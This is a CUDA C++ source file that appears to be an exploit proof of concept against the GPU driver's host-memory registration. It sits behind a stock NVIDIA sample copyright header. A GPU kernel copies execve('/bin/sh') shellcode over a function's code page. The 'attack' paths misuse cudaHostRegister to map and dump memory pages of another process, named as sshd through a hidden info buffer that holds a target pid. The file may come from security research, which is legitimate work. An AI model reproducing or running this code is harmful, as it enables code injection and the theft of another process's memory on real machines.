/**
 * Copyright 1993-2012 NVIDIA Corporation.  All rights reserved.
 *
 * Please refer to the NVIDIA end user license agreement (EULA) associated
 * with this source code for terms and conditions that govern your use of
 * this software. Any use, reproduction, disclosure, or distribution of
 * this software and related documentation outside the terms of the EULA
 * is strictly prohibited.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <cuda.h>
#include <fstream>
#include <string>
#include <iostream>
#include <sstream>



#define ALIGN 0x1000
using namespace std;

// Some dirtry tricks, should be replaced by mmap()
void *aligned_malloc(int size) {
    void *mem = malloc(size+ALIGN+sizeof(void*));
    void **ptr = (void**)((long)(mem+ALIGN+sizeof(void*)) & ~(ALIGN-1));
    ptr[-1] = mem;
    return ptr;
}

void aligned_free(void *ptr) {
    free(((void**)ptr)[-1]);
}




//#define CU_MEMHOSTREGISTER_PORTABLE   0x01

//static const int WORK_SIZE = 256;

/**
 * This macro checks return value of the CUDA runtime call and exits
 * the application if the call failed.
 */
//int global;

#define CUDA_CHECK_RETURN(value) {											\
	cudaError_t _m_cudaStat = value;										\
	if (_m_cudaStat != cudaSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\n",					\
				cudaGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
		exit(1);															\
	} }

#define CUDA_CHECK_NORETURN(value) {											\
	cudaError_t _m_cudaStat = value;										\
	if (_m_cudaStat != cudaSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\nContinue\n",					\
				cudaGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
	} }


/* CUDA kernel to copy the shellcode. Basically copies to source with given offset. */
__global__ void PixsysCuda(char * d_source, int offset)
{
	//if (threadIdx.x == 0) printf("Inside PixsysCuda\n");
	char shellcode[] = {
			"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
			"\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
			"\x54\x5f\x6a\x3b\x58\x0f\x05\x90\x90\x90"
	};
		(d_source+offset)[threadIdx.x]=shellcode[threadIdx.x];

}

/* CUDA kernel to print out the dumped memory page. */
__global__ void PixsysCuda_print(char * d_source, int size)
{
  int i;
	printf("dumped memory page:\n");
  for (i = 0; i < size; i ++) printf("%02x", d_source[i]);
	printf("\n");
}

__global__ void print_kernel()
{
  int i;
	printf("dumped memory page:\n");
	printf("\n");
}

void Stub_Funct ()
{
	printf("NOTHING Here!\n");
	__asm__(
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
	);
}

/**
 * Host function that prepares data array and passes it to the CUDA kernel.
 */
typedef struct hidden_driver_info
{
//	long int start_addr;
//	long int end_addr;
	int pid;
	long int sshd_page_addr;
} hidden_driver_info ,*p_hidden_info;

typedef void (*s_funct) () ;
int main(void) {

#if 0
	print_kernel<<<1,1>>>();
	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete

	CUDA_CHECK_NORETURN(cudaPeekAtLastError());

	fflush(stdout);


#endif

	int pagesize = 0x1000;
	s_funct f;
	pagesize = getpagesize(); // get Page size of system (usually 0x1000)
	//printf("page size is: %d\n",pagesize);

	p_hidden_info info_for_cuda_driver = (p_hidden_info)aligned_malloc(sizeof(hidden_driver_info)); // malloc info hiden buffer

	printf("info buffer addr: 0x%llx\n",(unsigned long)info_for_cuda_driver);

  // Malloc alligned buffer.
#ifdef _ATTACK_1
	char * real_buff = (char*)aligned_malloc(pagesize*sizeof(char));
#endif
	char * dump_buff = (char*)aligned_malloc(pagesize*sizeof(char));

#ifdef _ATTACK_1
	memset(real_buff,0x4141,pagesize*sizeof(char)); // Fill buffer with 414141
#endif
	memset(dump_buff,1,pagesize*sizeof(char));

	/*calculate the victim function parameters*/
	f=&Stub_Funct;
	int offset = (unsigned long)f % 0x1000;
	int base = ((unsigned long)f / 0x1000)* 0x1000;
	f();
	printf("Stub Function Address: 0x%lx\n",(unsigned long)f);
	printf("Stub Function offset: 0x%lx\n",(unsigned long)offset);
	printf("Stub Function base: 0x%lx\n",(unsigned long)base);
	fflush(stdout);

	//printf("Buffer: 0x%08x\n",*(unsigned int *)real_buff);

	//Set hidden Address:
//	info_for_cuda_driver->start_addr = (unsigned long)base;
	info_for_cuda_driver->pid = 1424;
	//info_for_cuda_driver->sshd_page_addr = 0x7f1862dac000;

	char * d_real_buff;
	char * d_dump_buff;

	printf("GOING IN!\n");
	fflush(stdout);

	/* Try to set up the mallicious bit */
	try
	{
		cudaHostRegister((void *)0x0400000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
		cudaHostRegister((void *)0x0800000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
		cudaHostRegister((void *)0x01200000, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE) ;
	}
	catch (...)
	{
		printf("NAH");
	}
	/* register the info buffer. First things first... */
	CUDA_CHECK_RETURN(cudaHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE)) ;
	/* Map what a Nice guy would think is a benevelent buffer.
	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/

CUDA_CHECK_NORETURN(cudaPeekAtLastError());

#ifdef _ATTACK_1
	CUDA_CHECK_RETURN(cudaHostRegister((void *)real_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;

	/* Get device pointer of this buffer */
	CUDA_CHECK_RETURN(cudaHostGetDevicePointer((void**)&d_real_buff,real_buff,0));
	//printf("Device PTR is : 0x%08x\n",(unsigned int *)d_real_buff);
	fflush(stdout);

	/* info buffer in UM can be changed now. No effect. */
	//info_for_cuda_driver->start_addr = (unsigned long)stdout->_IO_write_base;
	//printf("write_base addr: 0x%lx\n",(unsigned long)stdout->_IO_write_base);
	//(stdout->_IO_write_base)[1]='W';

	/*Activate cuda kernel, that copies shellcode */
	PixsysCuda<<<1,64>>>(d_real_buff,offset);

//	fflush(stdout);

	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
#endif

#define _ATTACK_2
#ifdef _ATTACK_2

//	for (int i = 0; i < 10; i ++) {
	{
	/* Map this buffer to a memory page which currently maped by sshd. */
	CUDA_CHECK_RETURN(cudaHostRegister((void *)dump_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;

	/* Get device pointer of this buffer */
	CUDA_CHECK_RETURN(cudaHostGetDevicePointer((void**)&d_dump_buff, dump_buff,0));

	fflush(stdout);
  // test print cpu side dump_buff, shoud be 4141
//	printf("dump_buff:\n");
//	memset(dump_buff,1,pagesize*sizeof(char));
//	for (int i = 0; i < 1024; i ++) printf("%d %c ", i, dump_buff[i]);

	/*Activate cuda kernel, that print the dumped page */
#if 0
	PixsysCuda_print<<<1,1>>>(d_dump_buff, pagesize);
	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
#endif
	}

	CUDA_CHECK_NORETURN(cudaPeekAtLastError());

	fflush(stdout);

#endif


	// should remove this?
#ifdef _ATTACK_1
		CUDA_CHECK_RETURN(cudaHostUnregister((void *)real_buff));
#endif
		CUDA_CHECK_RETURN(cudaHostUnregister((void *)dump_buff));
		CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
		CUDA_CHECK_NORETURN(cudaGetLastError());

		printf("Finished, now exiting.\n");

	//}
	//sleep(3000);
	/*for (i = 0; i < WORK_SIZE; i++)
		idata[i] = (unsigned int) i;

	CUDA_CHECK_RETURN(cudaMalloc((void**) &d, sizeof(int) * WORK_SIZE));
	CUDA_CHECK_RETURN(
			cudaMemcpy(d, idata, sizeof(int) * WORK_SIZE, cudaMemcpyHostToDevice));

	bitreverse<<<1, WORK_SIZE, WORK_SIZE * sizeof(int)>>>(d);
	*/
	//CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
	//CUDA_CHECK_NORETURN(cudaGetLastError());
	/*CUDA_CHECK_RETURN(cudaMemcpy(odata, d, sizeof(int) * WORK_SIZE, cudaMemcpyDeviceToHost));

	for (i = 0; i < WORK_SIZE; i++)
		printf("Input value: %u, device output: %u\n", idata[i], odata[i]);

	CUDA_CHECK_RETURN(cudaFree((void*) d));
	CUDA_CHECK_RETURN(cudaDeviceReset());
*/
	return 0;
}
